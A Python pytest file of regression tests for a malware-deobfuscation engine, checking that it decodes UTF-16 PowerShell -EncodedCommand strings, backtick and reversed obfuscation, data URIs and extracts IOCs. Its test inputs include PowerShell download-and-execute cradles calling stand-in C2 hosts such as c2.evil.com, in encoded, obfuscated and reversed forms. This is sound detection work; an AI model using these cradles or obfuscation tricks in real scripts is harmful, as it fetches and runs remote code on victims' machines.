"""RC2.2 decoder pack — regression tests.

Locks the deterministic behaviour of the RC2.2 additions so future
refactors can't silently regress:

    * utf16-decode          (UTF-16LE/BE detection + decode)
    * ps-reconstruct        ([char]NN, char[]-join, str-concat, backtick strip)
    * data-uri-extract      (RFC 2397 data: URI unwrap)
    * ioc-extractor         (URL/IP/domain/email/hash/BTC/path harvest)
    * base58-decode         (Bitcoin/Solana alphabet)
    * jwt-decode            (JWT header + payload)
    * reverse-string        (reverse-obfuscated commands)

And critically, verifies the composed end-to-end recovery of the
`powershell -EncodedCommand <UTF-16LE Base64>` pattern which is the
single most common failure mode observed in production traffic.
"""
from __future__ import annotations

import base64

import pytest

from engine.orchestrator import Orchestrator
from engine.models import AnalysisContext
from engine.registry import DecoderRegistry


@pytest.fixture(scope="module", autouse=True)
def _ensure_registry():
    _ = DecoderRegistry.all()          # warm autodiscover
    yield


def _run(payload: str):
    return Orchestrator(AnalysisContext()).run(payload)


# --------------------------------------------------------------------------- #
# Registry / discovery
# --------------------------------------------------------------------------- #
def test_rc22_plugins_registered():
    ids = {p.id for p in DecoderRegistry.all()}
    for expected in (
        "utf16-decode",
        "ps-reconstruct",
        "data-uri-extract",
        "ioc-extractor",
        "base58-decode",
        "jwt-decode",
        "reverse-string",
    ):
        assert expected in ids, f"{expected} not registered"


# --------------------------------------------------------------------------- #
# UTF-16LE — the killer PowerShell -EncodedCommand fix
# --------------------------------------------------------------------------- #
def test_ps_encoded_command_utf16le_end_to_end():
    inner = 'IEX (New-Object Net.WebClient).DownloadString("http://c2.evil.com/beacon.ps1")'
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    r = _run(f"powershell.exe -enc {b64}")
    assert r.terminal in ("complete", "english", "family-identified")
    assert "http://c2.evil.com/beacon.ps1" in r.output
    assert "http://c2.evil.com/beacon.ps1" in r.findings.iocs.urls
    ids = [s.decoder for s in r.trace]
    assert "utf16-decode" in ids


def test_utf16_be_bom():
    text = "hello world http://a.com/x"
    b = b"\xfe\xff" + text.encode("utf-16-be")
    latin1 = b.decode("latin-1")
    r = _run(latin1)
    ids = [s.decoder for s in r.trace]
    assert "utf16-decode" in ids


# --------------------------------------------------------------------------- #
# PowerShell backtick obfuscation — routes through extract-wrapper
# --------------------------------------------------------------------------- #
def test_powershell_backtick_obfuscation():
    inner = 'IEX (New-Object Net.WebClient).DownloadString("http://a.b/c")'
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    r = _run(f"p`ow`ers`h`ell -e {b64}")
    assert "http://a.b/c" in r.output


# --------------------------------------------------------------------------- #
# ps-reconstruct — [char]NN, [char[]]-join, string concat
# --------------------------------------------------------------------------- #
def test_ps_reconstruct_char_singletons():
    r = _run("$cmd = [char]0x49 + [char]0x45 + [char]0x58 + '_MARK_' " + "x" * 50)
    assert "IEX" in r.output
    assert "_MARK_" in r.output


def test_ps_reconstruct_char_array_join():
    r = _run("[char[]](80,111,119,101,114,83,104,101,108,108) -join '' + '_MARK_'")
    assert "PowerShell" in r.output
    assert "_MARK_" in r.output


# --------------------------------------------------------------------------- #
# data-uri-extract — Base64 + percent-encoded variants
# --------------------------------------------------------------------------- #
def test_data_uri_base64_extract():
    body = base64.b64encode(b"<html>evil.com/x</html>").decode()
    r = _run(f"data:text/html;base64,{body}")
    assert "<html>" in r.output or "evil.com" in r.output


def test_data_uri_plain_percent_encoded():
    r = _run("data:text/plain,hello%20world%20from%20nivx")
    assert "hello world from nivx" in r.output


# --------------------------------------------------------------------------- #
# ioc-extractor — surfaces IOCs even without prior transforms
# --------------------------------------------------------------------------- #
def test_ioc_extractor_urls_and_ips():
    r = _run(
        "Connect to http://malware.evil.com/beacon and callback 203.0.113.42 "
        "then exfil to badactor@evil.example "
        "MD5:5d41402abc4b2a76b9719d911017c592"
    )
    assert "http://malware.evil.com/beacon" in r.findings.iocs.urls
    assert "203.0.113.42" in r.findings.iocs.ips
    assert "badactor@evil.example" in r.findings.iocs.emails
    assert "5d41402abc4b2a76b9719d911017c592" in r.findings.iocs.md5


def test_ioc_extractor_bitcoin_address():
    r = _run("Payment: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 by tomorrow http://x.com/y")
    assert "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2" in r.findings.iocs.bitcoin_addresses


# --------------------------------------------------------------------------- #
# base58 — wallet-style payloads defer to base58 over base64
# --------------------------------------------------------------------------- #
def test_base58_wallet_prefix_wins_over_base64():
    r = _run("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2")
    ids = [s.decoder for s in r.trace]
    assert "base58-decode" in ids
    assert "base64-decode" not in ids


# --------------------------------------------------------------------------- #
# JWT — no downstream mangling
# --------------------------------------------------------------------------- #
def test_jwt_terminal_no_downstream_xor():
    jwt = (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9."
        "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    )
    r = _run(jwt)
    ids = [s.decoder for s in r.trace]
    assert ids == ["jwt-decode"], f"JWT should be terminal, got {ids}"
    assert "HS256" in r.output
    assert "1234567890" in r.output


# --------------------------------------------------------------------------- #
# reverse-string — only fires on payloads with reversed hints
# --------------------------------------------------------------------------- #
def test_reverse_string_fires_on_reversed_url():
    rev = 'IEX (New-Object Net.WebClient).DownloadString("http://bad.com/x.ps1")'[::-1]
    r = _run(rev)
    ids = [s.decoder for s in r.trace]
    assert "reverse-string" in ids
    assert "http://bad.com/x.ps1" in r.output


def test_reverse_string_does_not_fire_on_plain_english():
    r = _run("The quick brown fox jumps over the lazy dog." * 3)
    ids = [s.decoder for s in r.trace]
    assert "reverse-string" not in ids


# --------------------------------------------------------------------------- #
# XOR-brute must not run on structured JSON / decoded text
# --------------------------------------------------------------------------- #
def test_xor_brute_skips_structured_text():
    text = (
        '# JWT decoded\n'
        'header = { "alg": "HS256" }\n'
        'payload = { "sub": "12345", "iat": 1516239022 }\n'
    )
    r = _run(text)
    ids = [s.decoder for s in r.trace]
    assert "xor-brute" not in ids, (
        f"xor-brute must not fire on structured text: {ids}"
    )


def test_xor_brute_skips_short_binary_output():
    """After base58-decoding a 34-char wallet address we get ~25 opaque bytes.
    Brute-XORing those is meaningless and produces analyst noise."""
    r = _run("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2")
    ids = [s.decoder for s in r.trace]
    assert "xor-brute" not in ids, f"xor-brute fired on short binary: {ids}"
